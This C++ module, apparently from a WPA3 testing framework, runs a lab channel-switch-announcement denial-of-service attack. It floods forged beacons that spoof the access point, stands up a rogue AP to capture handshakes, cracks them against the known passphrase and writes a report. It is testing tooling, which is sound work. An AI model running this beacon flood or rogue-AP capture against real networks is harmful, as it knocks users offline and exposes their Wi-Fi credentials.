#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include <cassert>
#include <chrono>
#include <filesystem>
#include <optional>
#include <thread>
#include <nlohmann/json.hpp>

#include "default.h"
#include "inteprrupt.h"
#include "attacks/components/setup_connections.h"
#include "ex_program/hostapd/hostapd.h"
#include "ex_program/hostapd/hostapd_helper.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "logger/report.h"
#include "observer/observers.h"
#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"
#include "system/utils.h"

namespace wpa3_tester::CSA_attack{
using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;

RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const string &ssid, const Channel &ap_channel,
						const Channel &new_channel, const int switch_count
){
	Dot11Beacon beacon;
	beacon.addr1(Dot11::BROADCAST);
	beacon.addr2(ap_mac);
	beacon.addr3(ap_mac);
	beacon.ssid(ssid);
	beacon.ds_parameter_set(ap_channel.ch_num);

	Dot11ManagementFrame::channel_switch_type cs;
	cs.switch_mode = 1;
	cs.new_channel = static_cast<uint8_t>(new_channel.ch_num);
	cs.switch_count = switch_count;
	beacon.channel_switch(cs);

	RadioTap radiotap;
	//const int freq_mhz = hw_capabilities::channel_to_freq(ap_channel);
	//radiotap.channel(freq_mhz, RadioTap::OFDM);
	radiotap.inner_pdu(beacon);
	//radiotap.flags(RadioTap::FCS); // tell driver to check FCS (can be invalid for some drivers)
	return radiotap;
}

void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const string &iface_name,
					const string &ssid, const Channel &ap_channel, const Channel &new_channel, const int ms_interval,
					const int attack_time
){
	const NetworkInterface iface(iface_name);
	const auto end_time = steady_clock::now() + seconds(attack_time);

	PacketSender sender;
	while(steady_clock::now() < end_time && !g_interrupted.load()){
		RadioTap csa_rt = get_CSA_beacon(ap_mac, ssid, ap_channel, new_channel);
		sender.send(csa_rt, iface);
		this_thread::sleep_for(milliseconds(ms_interval));
	}

	cout << "check_vulnerable called with:\n" << "AP MAC: " << ap_mac << "\n" << "STA MAC: " << sta_mac << "\n" <<
			"Interface: " << iface_name << "\n" << "Channel: " << ap_channel.ch_num << "\n" << "SSID: " << ssid << endl;
}

// ----------------- MODULE functions ------------------
void setup_chs_attack(RunStatus &rs){
	components::client_ap_setup(rs);
	components::setup_rogue_ap(rs);
}

void run_chs_attack(RunStatus &rs){
	const auto &att_cfg = rs.config().at("attack_config");
	const auto &ap_actor = rs.get_actor("access_point");

	const HWAddress<6> ap_mac(rs.get_actor("access_point").get(SK::mac));
	const HWAddress<6> sta_mac(rs.get_actor("client").get(SK::mac));
	const string iface_name = rs.get_actor("attacker")["iface"];
	const string essid = ap_actor.get(SK::ssid);
	const Channel old_channel = ap_actor->get_channel();
	const Channel new_channel{
		att_cfg.at("new_channel").get<int>(), ap_actor->get_channel().band, ap_actor[SK::ht_mode]
	};
	const int ms_interval = att_cfg.at("ms_interval");
	const int attack_time = att_cfg.at("attack_time");

	rs.start_observers();

	interruptible_sleep(seconds(10));
	if(g_interrupted.load()) return;
	log(LogLevel::INFO, "Attack START");
	check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);
	log(LogLevel::INFO, "Attack END");
	interruptible_sleep(seconds(10));

	rs.process_manager.stop_all();
}

void generate_report(const RunStatus &rs, const path &STA_graph_path, const path &AP_graph_path,
					const path &ATT_graph_path, const path &rogue_graph_path,
					const optional<hostapd::CrackResult> &crack_result
){
	const path report_path = rs.run_folder() / REPORT_NAME;
	ofstream report(report_path);
	if(!report.is_open()){
		log(LogLevel::ERROR, "Failed to create report file!");
		return;
	}
	set_public_perms(report_path);

	report << "# CSA DoS Attack\n\n";
	//FIXME link to CSA attack
	//report << "Channel switch announcement will change channel of station, station will disconnect\n\n";
	report::attack_config_table(report, rs);
	report::attack_mapping_table(report, rs);
	//report << "### Traffic Analysis\n";
	//report << "Charts represent the network speed captured during the test. (STA->AP)\n";
	//report <<
	//		"Successful CSA attack is characterized by sharp drop in received packets on the AP side as the client switches channels.\n";
	//TODO add hostapd helper ?
	if(!STA_graph_path.empty()){
		report << "### STA (client, wpa_supplicant " << hostapd::get_version(rs, "client") << ")\n";
		report << "![STA Throughput Graph](" << relative(STA_graph_path, rs.run_folder()).string() << ")\n\n";
	}
	if(!AP_graph_path.empty()){
		report << "### AP (access_point, hostapd " << hostapd::get_version(rs, "access_point") << ")\n";
		report << "![AP Throughput Graph](" << relative(AP_graph_path, rs.run_folder()).string() << ")\n\n";
	}
	if(!ATT_graph_path.empty()){
		report << "### ATT (access_point, hostapd-mana " << hostapd::get_version(rs, "access_point") << ")\n";
		report << "![ATT Throughput Graph](" << relative(ATT_graph_path, rs.run_folder()).string() << ")\n\n";
	}
	if(!rogue_graph_path.empty()){
		report << "###  Rogue AP (rogue_ap)\n";
		report << "![Rogue AP Throughput Graph](" << relative(rogue_graph_path, rs.run_folder()).string() << ")\n\n";
	}
	if(crack_result.has_value()){
		report << "## Credential Cracking (hcxpmktool)\n";
		report << "Each captured handshake was verified against the known PSK using hcxpmktool.\n\n";
		report << "| Metric | Value |\n|--------|-------|\n";
		report << "| Captured handshakes | " << crack_result->total << " |\n";
		report << "| Successfully cracked | " << crack_result->cracked << " |\n\n";
	}

	report << "---\n";
	report.close();
}

void stats_chs_attack(const RunStatus &rs){
	log(LogLevel::INFO, "CSA attack stats");

	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, {
					{"access_point", "did not acknowledge", "ACK_fail", "red"},
					{"client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH", "SWITCH", "blue"},
					{"client", "CTRL-EVENT-DISCONNECTED", "DISCONN", "red"},
					{"access_point", "EAPOL-4WAY-HS-COMPLETED", "4Way", "green"},
					{"client", START_tag, "START", "black"}, {"client", END_tag, "END", "black"},
				});

	const bool disconnected = !get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED").empty();
	const bool ap_disconnected = !get_time_logs(rs, "access_point", "AP-STA-DISCONNECTED").empty();

	optional<hostapd::CrackResult> crack_result;
	optional<bool> rogue_ap_connected;
	if(rs.config().at("actors").contains("rogue_ap")){
		const auto mana_events = get_time_logs(rs, "rogue_ap", "Captured a WPA");
		elements.push_back(make_unique<EventLines>(mana_events, "MANA", "black"));
		rogue_ap_connected = !mana_events.empty();

		string psk = hostapd::get_password(rs, "client");
		if(psk.empty()) psk = "password123"; //TODO hardcoded
		crack_result = hostapd::crack_pmk_hashes(rs.run_folder() / "captured_hashes.txt", psk);
	}

	nlohmann::json result = {
		{"disconnected", disconnected},
		{"ap_disconnected", ap_disconnected}
	};

	if(rogue_ap_connected.has_value()) result["rogue_ap_connected"] = rogue_ap_connected.value();
	rs.save_result(result);

	const string client_mac = rs.get_actor("client").get(SK::mac);
	observer::tshark::pcap_events(rs, elements, {
									{
										"attacker", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac,
										"client PROBE", "black"
									},
									{
										"rogue_ap", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac,
										"client PROBE", "red"
									}
								});

	const path STA_graph_path = observer::tshark::tshark_graph(rs, "client", elements);
	const path AP_graph_path = observer::tshark::tshark_graph(rs, "access_point", elements,
															observer::get_observer_folder(rs, "tcpdump"));

	const path ATT_graph_path = observer::tshark::tshark_graph(rs, "attacker", elements);
	const path rogue_graph_path = observer::tshark::tshark_graph(rs, "rogue_ap", elements);

	generate_report(rs, STA_graph_path, AP_graph_path, ATT_graph_path, rogue_graph_path, crack_result);
}
}
